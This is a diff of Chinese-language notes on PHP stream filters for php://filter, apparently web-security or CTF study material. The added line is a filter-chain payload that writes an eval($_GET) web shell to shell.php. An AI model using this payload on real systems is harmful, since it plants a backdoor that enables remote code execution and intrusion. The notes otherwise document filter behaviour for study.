@@ -42,7 +42,9 @@ write=<写链的筛选列表>
     -   string.rot13
     -   string.toupper 将所有字符转换为大写
     -   string.tolower 将所有字符转换为小写
-    -   string.strip_tags 用来处理读入的所有标签
+	    - `php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=shell.php
+`
+    -   string.strip_tags 用来处理读入的所有标签（从字符串中去除 HTML 和 PHP 标记）
 -   转换过滤器
     -   convert.base64-encode & convert.base64-decode base64加解密
     -   convert.quoted-printable-encode & convert.quoted-printable-decode 可以翻译为可打印字符引用编码，使用可以打印的ASCLL编码的字符表示各种编码形式下的字符
